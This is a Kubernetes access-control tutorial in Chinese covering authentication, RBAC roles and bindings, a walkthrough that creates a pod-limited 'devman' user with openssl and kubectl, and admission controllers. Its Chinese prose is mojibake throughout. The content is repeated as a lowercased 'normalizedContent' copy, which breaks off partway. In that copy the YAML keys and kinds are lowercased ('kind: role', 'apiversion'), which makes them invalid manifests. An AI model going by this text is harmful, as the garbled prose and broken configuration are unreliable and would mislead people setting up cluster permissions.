åéåéç»æå¡ç«¯ãæå¡ç«¯æ¶å°åè¿è¡è§£ç ï¼è·åç¨æ·ååå¯ç ï¼ç¶åè¿è¡ç¨æ·èº«ä»½è®¤è¯çè¿ç¨ã\n\n * HTTPS è¯ä¹¦è®¤è¯ï¼åºäº CA æ ¹è¯ä¹¦ç­¾åçååæ°å­è¯ä¹¦è®¤è¯æ¹å¼\n\n> è¿ç§è®¤è¯æ¹å¼æ¯å®å¨æ§æé«çä¸ç§æ¹å¼ï¼ä½æ¯åæ¶ä¹æ¯æä½èµ·æ¥æéº»ç¦çä¸ç§æ¹å¼ã\n\n\n\nHTTPS è®¤è¯å¤§ä½åä¸º 3 ä¸ªè¿ç¨ï¼\n1. è¯ä¹¦ç³è¯·åä¸å\n\n> HTTPS éä¿¡åæ¹çæå¡å¨å CA æºæç³è¯·è¯ä¹¦ï¼CA æºæä¸åæ ¹è¯ä¹¦ãæå¡ç«¯è¯ä¹¦åç§é¥ç»ç³è¯·è\n\n2. å®¢æ·ç«¯åæå¡ç«¯çååè®¤è¯\n\n> 1> å®¢æ·ç«¯åæå¡å¨ç«¯åèµ·è¯·æ±ï¼æå¡ç«¯ä¸åèªå·±çè¯ä¹¦ç»å®¢æ·ç«¯ï¼\n> å®¢æ·ç«¯æ¥æ¶å°è¯ä¹¦åï¼éè¿ç§é¥è§£å¯è¯ä¹¦ï¼å¨è¯ä¹¦ä¸­è·å¾æå¡ç«¯çå¬é¥ï¼\n> å®¢æ·ç«¯å©ç¨æå¡å¨ç«¯çå¬é¥è®¤è¯è¯ä¹¦ä¸­çä¿¡æ¯ï¼å¦æä¸è´ï¼åè®¤å¯è¿ä¸ªæå¡å¨\n> 2> å®¢æ·ç«¯åéèªå·±çè¯ä¹¦ç»æå¡å¨ç«¯ï¼æå¡ç«¯æ¥æ¶å°è¯ä¹¦åï¼éè¿ç§é¥è§£å¯è¯ä¹¦ï¼\n> å¨è¯ä¹¦ä¸­è·å¾å®¢æ·ç«¯çå¬é¥ï¼å¹¶ç¨è¯¥å¬é¥è®¤è¯è¯ä¹¦ä¿¡æ¯ï¼ç¡®è®¤å®¢æ·ç«¯æ¯å¦åæ³\n\n3. æå¡å¨ç«¯åå®¢æ·ç«¯è¿è¡éä¿¡\n\n> æå¡å¨ç«¯åå®¢æ·ç«¯ååå¥½å å¯æ¹æ¡åï¼å®¢æ·ç«¯ä¼äº§çä¸ä¸ªéæºçç§é¥å¹¶å å¯ï¼ç¶ååéå°æå¡å¨ç«¯ã\n> æå¡å¨ç«¯æ¥æ¶è¿ä¸ªç§é¥åï¼åæ¹æ¥ä¸æ¥éä¿¡çææåå®¹é½éè¿è¯¥éæºç§é¥å å¯\n\n> æ³¨æ: Kubernetes åè®¸åæ¶éç½®å¤ç§è®¤è¯æ¹å¼ï¼åªè¦å¶ä¸­ä»»æä¸ä¸ªæ¹å¼è®¤è¯éè¿å³å¯\n\n\n# ææç®¡ç\n\nææåçå¨è®¤è¯æåä¹åï¼éè¿è®¤è¯å°±å¯ä»¥ç¥éè¯·æ±ç¨æ·æ¯è°ï¼ ç¶å Kubernetes ä¼æ ¹æ®äºåå®ä¹çææç­ç¥æ¥å³å®ç¨æ·æ¯å¦ææéè®¿é®ï¼è¿ä¸ªè¿ç¨å°±ç§°ä¸ºææã\n\næ¯ä¸ªåéå° ApiServer çè¯·æ±é½å¸¦ä¸äºç¨æ·åèµæºçä¿¡æ¯ï¼æ¯å¦åéè¯·æ±çç¨æ·ãè¯·æ±çè·¯å¾ãè¯·æ±çå¨ä½ç­ï¼ææå°±æ¯æ ¹æ®è¿äºä¿¡æ¯åææç­ç¥è¿è¡æ¯è¾ï¼å¦æç¬¦åç­ç¥ï¼åè®¤ä¸ºææéè¿ï¼å¦åä¼è¿åéè¯¯ã\n\nAPI Server ç®åæ¯æä»¥ä¸å ç§ææç­ç¥ï¼\n\n * AlwaysDenyï¼è¡¨ç¤ºæç»ææè¯·æ±ï¼ä¸è¬ç¨äºæµè¯\n * AlwaysAllowï¼åè®¸æ¥æ¶ææè¯·æ±ï¼ç¸å½äºéç¾¤ä¸éè¦æææµç¨ï¼Kubernetes é»è®¤çç­ç¥ï¼\n * ABACï¼åºäºå±æ§çè®¿é®æ§å¶ï¼è¡¨ç¤ºä½¿ç¨ç¨æ·éç½®çææè§åå¯¹ç¨æ·è¯·æ±è¿è¡å¹éåæ§å¶\n * Webhookï¼éè¿è°ç¨å¤é¨ REST æå¡å¯¹ç¨æ·è¿è¡ææ\n * Nodeï¼æ¯ä¸ç§ä¸ç¨æ¨¡å¼ï¼ç¨äºå¯¹ kubelet ååºçè¯·æ±è¿è¡è®¿é®æ§å¶\n * RBACï¼åºäºè§è²çè®¿é®æ§å¶ï¼kubeadm å®è£æ¹å¼ä¸çé»è®¤éé¡¹ï¼\n\nRBAC (Role-Based Access Control) åºäºè§è²çè®¿é®æ§å¶ï¼ä¸»è¦æ¯å¨æè¿°ä¸ä»¶äºæï¼ç»åªäºå¯¹è±¡æäºäºåªäºæé\n\nå¶ä¸­æ¶åå°äºä¸é¢å ä¸ªæ¦å¿µï¼\n\n * å¯¹è±¡ï¼UserãGroupsãServiceAccount\n * è§è²ï¼ä»£è¡¨çä¸ç»å®ä¹å¨èµæºä¸çå¯æä½å¨ä½ (æé) çéå\n * ç»å®ï¼å°å®ä¹å¥½çè§è²è·ç¨æ·ç»å®å¨ä¸èµ·\n\n\n\nRBAC å¼å¥äº 4 ä¸ªé¡¶çº§èµæºå¯¹è±¡ï¼\n\n * RoleãClusterRoleï¼è§è²ï¼ç¨äºæå®ä¸ç»æé\n * RoleBindingãClusterRoleBindingï¼è§è²ç»å®ï¼ç¨äºå°è§è²ï¼æéï¼èµäºç»å¯¹è±¡\n\nRoleãClusterRole\nä¸ä¸ªè§è²å°±æ¯ä¸ç»æéçéåï¼è¿éçæéé½æ¯è®¸å¯å½¢å¼çï¼ç½ååï¼ã\n\n# Roleåªè½å¯¹å½åç©ºé´åçèµæºè¿è¡ææï¼éè¦æå®nameapce\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: authorization-role\nrules:\n- apiGroups: [""]  # æ¯æçAPIç»åè¡¨,"" ç©ºå­ç¬¦ä¸²ï¼è¡¨ç¤ºæ ¸å¿APIç¾¤\n  resources: ["pods"] # æ¯æçèµæºå¯¹è±¡åè¡¨\n  verbs: ["get", "watch", "list"] # åè®¸çå¯¹èµæºå¯¹è±¡çæä½æ¹æ³åè¡¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# ClusterRoleå¯ä»¥å¯¹éç¾¤èå´åèµæºãè·¨namespacesçèå´èµæºãéèµæºç±»åè¿è¡ææ\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole\nrules:\n- apiGroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¦è¯¦ç»è¯´æçæ¯ï¼rules ä¸­çåæ°ï¼\n\n * apiGroups: æ¯æç API ç»åè¡¨\n\n"","apps", "autoscaling", "batch"\n\n\n1\n\n * resourcesï¼æ¯æçèµæºå¯¹è±¡åè¡¨\n\n"services", "endpoints", "pods","secrets","configmaps","crontabs","deployments","jobs",\n"nodes","rolebindings","clusterroles","daemonsets","replicasets","statefulsets",\n"horizontalpodautoscalers","replicationcontrollers","cronjobs"\n\n\n1\n2\n3\n\n * verbsï¼å¯¹èµæºå¯¹è±¡çæä½æ¹æ³åè¡¨\n\n"get", "list", "watch", "create", "update", "patch", "delete", "exec"\n\n\n1\n\n\nRoleBindingãClusterRoleBinding\nè§è²ç»å®ç¨æ¥æä¸ä¸ªè§è²ç»å®å°ä¸ä¸ªç®æ å¯¹è±¡ä¸ï¼ç»å®ç®æ å¯ä»¥æ¯ UserãGroup æè ServiceAccountã\n\n# RoleBindingå¯ä»¥å°åä¸namespaceä¸­çsubjectç»å®å°æä¸ªRoleä¸ï¼åæ­¤subjectå³å·æè¯¥Roleå®ä¹çæé\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: authorization-role\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# ClusterRoleBindingå¨æ´ä¸ªéç¾¤çº§å«åæænamespaceså°ç¹å®çsubjectä¸ClusterRoleç»å®ï¼æäºæé\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole-binding\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: authorization-clusterrole\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nRoleBinding å¼ç¨ ClusterRole è¿è¡ææ\nRoleBinding å¯ä»¥å¼ç¨ ClusterRoleï¼å¯¹å±äºåä¸å½åç©ºé´å ClusterRole å®ä¹çèµæºä¸»ä½è¿è¡ææã\n\n> ä¸ç§å¾å¸¸ç¨çåæ³å°±æ¯ï¼éç¾¤ç®¡çåä¸ºéç¾¤èå´é¢å®ä¹å¥½ä¸ç»è§è²ï¼ClusterRoleï¼ï¼ç¶åå¨å¤ä¸ªå½åç©ºé´ä¸­éå¤ä½¿ç¨è¿äº ClusterRoleãè¿æ ·å¯ä»¥å¤§å¹æé«ææç®¡çå·¥ä½æçï¼ä¹ä½¿å¾åä¸ªå½åç©ºé´ä¸çåºç¡æ§ææè§åä¸ä½¿ç¨ä½éªä¿æä¸è´ã\n\n# è½ç¶authorization-clusterroleæ¯ä¸ä¸ªéç¾¤è§è²ï¼ä½æ¯å ä¸ºä½¿ç¨äºRoleBinding\n# æä»¥heimaåªè½è¯»ådevå½åç©ºé´ä¸­çèµæº\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding-ns\n  namespace: dev\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: authorization-clusterrole\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå®æï¼åå»ºä¸ä¸ªåªè½ç®¡ç dev ç©ºé´ä¸ Pods èµæºçè´¦å·\n1. åå»ºè´¦å·\n\n# 1) åå»ºè¯ä¹¦\n[root@k8s-master01 pki]# cd /etc/kubernetes/pki/\n[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)\n\n# 2) ç¨apiserverçè¯ä¹¦å»ç­¾ç½²\n# 2-1) ç­¾åç³è¯·ï¼ç³è¯·çç¨æ·æ¯devman,ç»æ¯devgroup\n[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj "/CN=devman/O=devgroup"     \n# 2-2) ç­¾ç½²è¯ä¹¦\n[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out devman.crt -days 3650\n\n# 3) è®¾ç½®éç¾¤ãç¨æ·ãä¸ä¸æä¿¡æ¯\n[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443\n\n[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key\n\n[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman\n\n# åæ¢è´¦æ·å°devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nSwitched to context "devman@kubernetes".\n\n# æ¥çdevä¸podï¼åç°æ²¡ææé\n[root@k8s-master01 pki]# kubectl get pods -n dev\nError from server (Forbidden): pods is forbidden: User "devman" cannot list resource "pods" in API group "" in the namespace "dev"\n\n# åæ¢å°adminè´¦æ·\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nSwitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n2. åå»º Role å RoleBindingï¼ä¸º devman ç¨æ·ææ\n\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: dev-role\nrules:\n- apiGroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n  \n---\n\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: User\n  name: devman\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: dev-role\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n[root@k8s-master01 pki]# kubectl create -f dev-role.yaml\nrole.rbac.authorization.k8s.io/dev-role created\nrolebinding.rbac.authorization.k8s.io/authorization-role-binding created\n\n\n1\n2\n3\n\n\n3. åæ¢è´¦æ·ï¼åæ¬¡éªè¯\n\n# åæ¢è´¦æ·å°devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nSwitched to context "devman@kubernetes".\n\n# åæ¬¡æ¥ç\n[root@k8s-master01 pki]# kubectl get pods -n dev\nNAME                                 READY   STATUS             RESTARTS   AGE\nnginx-deployment-66cb59b984-8wp2k    1/1     Running            0          4d1h\nnginx-deployment-66cb59b984-dc46j    1/1     Running            0          4d1h\nnginx-deployment-66cb59b984-thfck    1/1     Running            0          4d1h\n\n# ä¸ºäºä¸å½±ååé¢çå­¦ä¹ ,ååadminè´¦æ·\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nSwitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# åå¥æ§å¶\n\néè¿äºåé¢çè®¤è¯åææä¹åï¼è¿éè¦ç»è¿åå¥æ§å¶å¤çéè¿ä¹åï¼apiserver æä¼å¤çè¿ä¸ªè¯·æ±ã\n\nåå¥æ§å¶æ¯ä¸ä¸ªå¯éç½®çæ§å¶å¨åè¡¨ï¼å¯ä»¥éè¿å¨ Api-Server ä¸éè¿å½ä»¤è¡è®¾ç½®éæ©æ§è¡åªäºåå¥æ§å¶å¨ï¼\n\n--admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,\n                      DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds\n\n\n1\n2\n\n\nåªæå½ææçåå¥æ§å¶å¨é½æ£æ¥éè¿ä¹åï¼apiserver ææ§è¡è¯¥è¯·æ±ï¼å¦åè¿åæç»ã\n\nå½åå¯éç½®ç Admission Control åå¥æ§å¶å¦ä¸ï¼\n\n * AlwaysAdmitï¼åè®¸ææè¯·æ±\n * AlwaysDenyï¼ç¦æ­¢ææè¯·æ±ï¼ä¸è¬ç¨äºæµè¯\n * AlwaysPullImagesï¼å¨å¯å¨å®¹å¨ä¹åæ»å»ä¸è½½éå\n * DenyExecOnPrivilegedï¼å®ä¼æ¦æªæææ³å¨ Privileged Container ä¸æ§è¡å½ä»¤çè¯·æ±\n * ImagePolicyWebhookï¼è¿ä¸ªæä»¶å°åè®¸åç«¯çä¸ä¸ª Webhook ç¨åºæ¥å®æ admission controller çåè½ã\n * Service Accountï¼å®ç° ServiceAccount å®ç°äºèªå¨å\n * SecurityContextDenyï¼è¿ä¸ªæä»¶å°ä½¿ç¨ SecurityContext ç Pod ä¸­çå®ä¹å¨é¨å¤±æ\n * ResourceQuotaï¼ç¨äºèµæºéé¢ç®¡çç®çï¼è§å¯ææè¯·æ±ï¼ç¡®ä¿å¨ namespace ä¸çéé¢ä¸ä¼è¶æ \n * LimitRangerï¼ç¨äºèµæºéå¶ç®¡çï¼ä½ç¨äº namespace ä¸ï¼ç¡®ä¿å¯¹ Pod è¿è¡èµæºéå¶\n * InitialResourcesï¼ä¸ºæªè®¾ç½®èµæºè¯·æ±ä¸éå¶ç Podï¼æ ¹æ®å¶éåçåå²èµæºçä½¿ç¨æåµè¿è¡è®¾ç½®\n * NamespaceLifecycleï¼å¦æå°è¯å¨ä¸ä¸ªä¸å­å¨ç namespace ä¸­åå»ºèµæºå¯¹è±¡ï¼åè¯¥åå»ºè¯·æ±å°è¢«æç»ãå½å é¤ä¸ä¸ª namespace æ¶ï¼ç³»ç»å°ä¼å é¤è¯¥ namespace ä¸­ææå¯¹è±¡ã\n * DefaultStorageClassï¼ä¸ºäºå®ç°å±äº«å­å¨çå¨æä¾åºï¼ä¸ºæªæå® StorageClass æ PV ç PVC å°è¯å¹éé»è®¤ç StorageClassï¼å°½å¯è½åå°ç¨æ·å¨ç³è¯· PVC æ¶æéäºè§£çåç«¯å­å¨ç»è\n * DefaultTolerationSecondsï¼è¿ä¸ªæä»¶ä¸ºé£äºæ²¡æè®¾ç½® forgiveness tolerations å¹¶å·æ notready:NoExecute å unreachable:NoExecute ä¸¤ç§ taints ç Pod è®¾ç½®é»è®¤ç âå®¹å¿â æ¶é´ï¼ä¸º 5min\n * PodSecurityPolicyï¼è¿ä¸ªæä»¶ç¨äºå¨åå»ºæä¿®æ¹ Pod æ¶å³å®æ¯å¦æ ¹æ® Pod ç security context åå¯ç¨ç PodSecurityPolicy å¯¹ Pod çå®å¨ç­ç¥è¿è¡æ§å¶',normalizedContent:'# è®¿é®æ§å¶æ¦è¿°\n\nkubernetes ä½ä¸ºä¸ä¸ªåå¸å¼éç¾¤çç®¡çå·¥å·ï¼ä¿è¯éç¾¤çå®å¨æ§æ¯å¶ä¸ä¸ªéè¦çä»»å¡ãæè°çå®å¨æ§å¶å®å°±æ¯ä¿è¯å¯¹ kubernetes çåç§å®¢æ·ç«¯è¿è¡è®¤è¯åé´ææä½ã\n\nå®¢æ·ç«¯\nå¨ kubernetes éç¾¤ä¸­ï¼å®¢æ·ç«¯éå¸¸æä¸¤ç±»ï¼\n\n * user accountï¼ä¸è¬æ¯ç¬ç«äº kubernetes ä¹å¤çå¶ä»æå¡ç®¡ççç¨æ·è´¦å·ã\n * service accountï¼kubernetes ç®¡ççè´¦å·ï¼ç¨äºä¸º pod ä¸­çæå¡è¿ç¨å¨è®¿é® kubernetes æ¶æä¾èº«ä»½æ è¯ã\n\n\n\nè®¤è¯ãææä¸åå¥æ§å¶\napiserver æ¯è®¿é®åç®¡çèµæºå¯¹è±¡çå¯ä¸å¥å£ãä»»ä½ä¸ä¸ªè¯·æ±è®¿é® apiserverï¼é½è¦ç»è¿ä¸é¢ä¸ä¸ªæµç¨ï¼\n\n * authenticationï¼è®¤è¯ï¼ï¼èº«ä»½é´å«ï¼åªææ­£ç¡®çè´¦å·æè½å¤éè¿è®¤è¯\n * authorizationï¼ææï¼ï¼ å¤æ­ç¨æ·æ¯å¦ææéå¯¹è®¿é®çèµæºæ§è¡ç¹å®çå¨ä½\n * admission controlï¼åå¥æ§å¶ï¼ï¼ç¨äºè¡¥åæææºå¶ä»¥å®ç°æ´å ç²¾ç»çè®¿é®æ§å¶åè½ã\n\n\n# è®¤è¯ç®¡ç\n\nkubernetes éç¾¤å®å¨çæå³é®ç¹å¨äºå¦ä½è¯å«å¹¶è®¤è¯å®¢æ·ç«¯èº«ä»½ï¼å®æä¾äº 3 ç§å®¢æ·ç«¯èº«ä»½è®¤è¯æ¹å¼ï¼\n\n * http base è®¤è¯ï¼éè¿ç¨æ·å + å¯ç çæ¹å¼è®¤è¯\n\n> è¿ç§è®¤è¯æ¹å¼æ¯æ âç¨æ·åï¼å¯ç â ç¨ base64 ç®æ³è¿è¡ç¼ç åçå­ç¬¦ä¸²æ¾å¨ http è¯·æ±ä¸­ç header authorization åéåéç»æå¡ç«¯ãæå¡ç«¯æ¶å°åè¿è¡è§£ç ï¼è·åç¨æ·ååå¯ç ï¼ç¶åè¿è¡ç¨æ·èº«ä»½è®¤è¯çè¿ç¨ã\n\n * https è¯ä¹¦è®¤è¯ï¼åºäº ca æ ¹è¯ä¹¦ç­¾åçååæ°å­è¯ä¹¦è®¤è¯æ¹å¼\n\n> è¿ç§è®¤è¯æ¹å¼æ¯å®å¨æ§æé«çä¸ç§æ¹å¼ï¼ä½æ¯åæ¶ä¹æ¯æä½èµ·æ¥æéº»ç¦çä¸ç§æ¹å¼ã\n\n\n\nhttps è®¤è¯å¤§ä½åä¸º 3 ä¸ªè¿ç¨ï¼\n1. è¯ä¹¦ç³è¯·åä¸å\n\n> https éä¿¡åæ¹çæå¡å¨å ca æºæç³è¯·è¯ä¹¦ï¼ca æºæä¸åæ ¹è¯ä¹¦ãæå¡ç«¯è¯ä¹¦åç§é¥ç»ç³è¯·è\n\n2. å®¢æ·ç«¯åæå¡ç«¯çååè®¤è¯\n\n> 1> å®¢æ·ç«¯åæå¡å¨ç«¯åèµ·è¯·æ±ï¼æå¡ç«¯ä¸åèªå·±çè¯ä¹¦ç»å®¢æ·ç«¯ï¼\n> å®¢æ·ç«¯æ¥æ¶å°è¯ä¹¦åï¼éè¿ç§é¥è§£å¯è¯ä¹¦ï¼å¨è¯ä¹¦ä¸­è·å¾æå¡ç«¯çå¬é¥ï¼\n> å®¢æ·ç«¯å©ç¨æå¡å¨ç«¯çå¬é¥è®¤è¯è¯ä¹¦ä¸­çä¿¡æ¯ï¼å¦æä¸è´ï¼åè®¤å¯è¿ä¸ªæå¡å¨\n> 2> å®¢æ·ç«¯åéèªå·±çè¯ä¹¦ç»æå¡å¨ç«¯ï¼æå¡ç«¯æ¥æ¶å°è¯ä¹¦åï¼éè¿ç§é¥è§£å¯è¯ä¹¦ï¼\n> å¨è¯ä¹¦ä¸­è·å¾å®¢æ·ç«¯çå¬é¥ï¼å¹¶ç¨è¯¥å¬é¥è®¤è¯è¯ä¹¦ä¿¡æ¯ï¼ç¡®è®¤å®¢æ·ç«¯æ¯å¦åæ³\n\n3. æå¡å¨ç«¯åå®¢æ·ç«¯è¿è¡éä¿¡\n\n> æå¡å¨ç«¯åå®¢æ·ç«¯ååå¥½å å¯æ¹æ¡åï¼å®¢æ·ç«¯ä¼äº§çä¸ä¸ªéæºçç§é¥å¹¶å å¯ï¼ç¶ååéå°æå¡å¨ç«¯ã\n> æå¡å¨ç«¯æ¥æ¶è¿ä¸ªç§é¥åï¼åæ¹æ¥ä¸æ¥éä¿¡çææåå®¹é½éè¿è¯¥éæºç§é¥å å¯\n\n> æ³¨æ: kubernetes åè®¸åæ¶éç½®å¤ç§è®¤è¯æ¹å¼ï¼åªè¦å¶ä¸­ä»»æä¸ä¸ªæ¹å¼è®¤è¯éè¿å³å¯\n\n\n# ææç®¡ç\n\nææåçå¨è®¤è¯æåä¹åï¼éè¿è®¤è¯å°±å¯ä»¥ç¥éè¯·æ±ç¨æ·æ¯è°ï¼ ç¶å kubernetes ä¼æ ¹æ®äºåå®ä¹çææç­ç¥æ¥å³å®ç¨æ·æ¯å¦ææéè®¿é®ï¼è¿ä¸ªè¿ç¨å°±ç§°ä¸ºææã\n\næ¯ä¸ªåéå° apiserver çè¯·æ±é½å¸¦ä¸äºç¨æ·åèµæºçä¿¡æ¯ï¼æ¯å¦åéè¯·æ±çç¨æ·ãè¯·æ±çè·¯å¾ãè¯·æ±çå¨ä½ç­ï¼ææå°±æ¯æ ¹æ®è¿äºä¿¡æ¯åææç­ç¥è¿è¡æ¯è¾ï¼å¦æç¬¦åç­ç¥ï¼åè®¤ä¸ºææéè¿ï¼å¦åä¼è¿åéè¯¯ã\n\napi server ç®åæ¯æä»¥ä¸å ç§ææç­ç¥ï¼\n\n * alwaysdenyï¼è¡¨ç¤ºæç»ææè¯·æ±ï¼ä¸è¬ç¨äºæµè¯\n * alwaysallowï¼åè®¸æ¥æ¶ææè¯·æ±ï¼ç¸å½äºéç¾¤ä¸éè¦æææµç¨ï¼kubernetes é»è®¤çç­ç¥ï¼\n * abacï¼åºäºå±æ§çè®¿é®æ§å¶ï¼è¡¨ç¤ºä½¿ç¨ç¨æ·éç½®çææè§åå¯¹ç¨æ·è¯·æ±è¿è¡å¹éåæ§å¶\n * webhookï¼éè¿è°ç¨å¤é¨ rest æå¡å¯¹ç¨æ·è¿è¡ææ\n * nodeï¼æ¯ä¸ç§ä¸ç¨æ¨¡å¼ï¼ç¨äºå¯¹ kubelet ååºçè¯·æ±è¿è¡è®¿é®æ§å¶\n * rbacï¼åºäºè§è²çè®¿é®æ§å¶ï¼kubeadm å®è£æ¹å¼ä¸çé»è®¤éé¡¹ï¼\n\nrbac (role-based access control) åºäºè§è²çè®¿é®æ§å¶ï¼ä¸»è¦æ¯å¨æè¿°ä¸ä»¶äºæï¼ç»åªäºå¯¹è±¡æäºäºåªäºæé\n\nå¶ä¸­æ¶åå°äºä¸é¢å ä¸ªæ¦å¿µï¼\n\n * å¯¹è±¡ï¼userãgroupsãserviceaccount\n * è§è²ï¼ä»£è¡¨çä¸ç»å®ä¹å¨èµæºä¸çå¯æä½å¨ä½ (æé) çéå\n * ç»å®ï¼å°å®ä¹å¥½çè§è²è·ç¨æ·ç»å®å¨ä¸èµ·\n\n\n\nrbac å¼å¥äº 4 ä¸ªé¡¶çº§èµæºå¯¹è±¡ï¼\n\n * roleãclusterroleï¼è§è²ï¼ç¨äºæå®ä¸ç»æé\n * rolebindingãclusterrolebindingï¼è§è²ç»å®ï¼ç¨äºå°è§è²ï¼æéï¼èµäºç»å¯¹è±¡\n\nroleãclusterrole\nä¸ä¸ªè§è²å°±æ¯ä¸ç»æéçéåï¼è¿éçæéé½æ¯è®¸å¯å½¢å¼çï¼ç½ååï¼ã\n\n# roleåªè½å¯¹å½åç©ºé´åçèµæºè¿è¡ææï¼éè¦æå®nameapce\nkind: role\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: authorization-role\nrules:\n- apigroups: [""]  # æ¯æçapiç»åè¡¨,"" ç©ºå­ç¬¦ä¸²ï¼è¡¨ç¤ºæ ¸å¿apiç¾¤\n  resources: ["pods"] # æ¯æçèµæºå¯¹è±¡åè¡¨\n  verbs: ["get", "watch", "list"] # åè®¸çå¯¹èµæºå¯¹è±¡çæä½æ¹æ³åè¡¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# clusterroleå¯ä»¥å¯¹éç¾¤èå´åèµæºãè·¨namespacesçèå´èµæºãéèµæºç±»åè¿è¡ææ\nkind: clusterrole\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole\nrules:\n- apigroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¦è¯¦ç»è¯´æçæ¯ï¼rules ä¸­çåæ°ï¼\n\n * apigroups: æ¯æç api ç»åè¡¨\n\n"","apps", "autoscaling", "batch"\n\n\n1\n\n * resourcesï¼æ¯æçèµæºå¯¹è±¡åè¡¨\n\n"services", "endpoints", "pods","secrets","configmaps","crontabs","deployments","jobs",\n"nodes","rolebindings","clusterroles","daemonsets","replicasets","statefulsets",\n"horizontalpodautoscalers","replicationcontrollers","cronjobs"\n\n\n1\n2\n3\n\n * verbsï¼å¯¹èµæºå¯¹è±¡çæä½æ¹æ³åè¡¨\n\n"get", "list", "watch", "create", "update", "patch", "delete", "exec"\n\n\n1\n\n\nrolebindingãclusterrolebinding\nè§è²ç»å®ç¨æ¥æä¸ä¸ªè§è²ç»å®å°ä¸ä¸ªç®æ å¯¹è±¡ä¸ï¼ç»å®ç®æ å¯ä»¥æ¯ userãgroup æè serviceaccountã\n\n# rolebindingå¯ä»¥å°åä¸namespaceä¸­çsubjectç»å®å°æä¸ªroleä¸ï¼åæ­¤subjectå³å·æè¯¥roleå®ä¹çæé\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: role\n  name: authorization-role\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# clusterrolebindingå¨æ´ä¸ªéç¾¤çº§å«åæænamespaceså°ç¹å®çsubjectä¸clusterroleç»å®ï¼æäºæé\nkind: clusterrolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole-binding\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: clusterrole\n  name: authorization-clusterrole\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nrolebinding å¼ç¨ clusterrole è¿è¡ææ\nrolebinding å¯ä»¥å¼ç¨ clusterroleï¼å¯¹å±äºåä¸å½åç©ºé´å clusterrole å®ä¹çèµæºä¸»ä½è¿è¡ææã\n\n> 